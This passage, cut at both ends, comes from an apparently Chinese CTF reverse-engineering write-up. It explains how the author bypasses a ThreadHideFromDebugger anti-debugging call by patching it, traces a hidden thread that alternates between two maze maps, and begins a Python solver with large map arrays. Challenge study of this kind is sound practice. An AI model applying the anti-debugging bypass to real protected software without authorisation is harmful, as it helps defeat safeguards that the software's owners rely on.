ThreadInformationLength</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>这里第二个ThreadInformationClass传入的是17</p><p>对应的0x11标志是：ThreadHideFromDebugger</p><p>[<a href="https://bbs.kanxue.com/thread-249689.htm">原创]调试陷阱ThreadHideFromDebugger的另一种对抗方法-软件逆向-看雪-安全社区|安全招聘|kanxue.com</a></p><p>根据这个文章，可以看到效果是使调试器接收不到调试信息<br>然后调试就会寄掉</p><p>这里只需要跳过最后一行代码即可进入main函数中，为了后面调试方便，继续patch</p><p>然后再回到主函数，if里面有个sleep感觉是为了每轮开始时给那个检查函数足够的时间去检查的</p><p>如果是地图有问题那么off指向的东西肯定会变，所以下一个硬件写入断点</p><p>第一个循环完，没有问题，但是到sleep(0x28)的时候，断点被写入，忽然跳到了第5个线程</p><p><img src="https://s2.loli.net/2024/08/25/JADyt2mG9YVSbdn.png" alt="image-20240825000637454"></p><p>这时因为sleep函数会将当前线程暂时挂起让cpu去执行其它线程</p><p>在这里它把qword数组的第-8位写入了v2</p><p><img src="https://s2.loli.net/2024/08/25/aOwyM87qhuj2fL5.png" alt="image-20240825000825078"></p><p>那么我们就知道，它在另外一个线程检查了一个东西，然后写入这一轮(按1个字符算一轮)的地图。判断依据是什么呢</p><p><img src="https://s2.loli.net/2024/08/25/DNwxstMihH7KEdW.png" alt="image-20240825001138474"></p><p>很明显这里写入的是v2的值，v2的值根据v1来变化，v1根据test_num来变化，同时也和i，j有关</p><p>testnum每次和1比较同时每次都会被v1赋值，也就是说每一轮的test_num都是上一轮的v1得到的，由于v1为局部变量，一开始为0，所以test_num一定会是1，2，1，2交替</p><p>打上断点<br>发现test_num它只在这里被赋值。</p><p>然后给i和j打断点</p><p>调试的时候发现，由于i一直在main里面增加，所以一旦到新的一轮，这里就会触发，让j++，然后修改v1，赋值</p><p>至此，它的逻辑应该是：第一轮用map1，第二轮用map2，第三轮用map1…</p><p>然后就直接写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">map1 = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line">       <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">map2 = [</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span 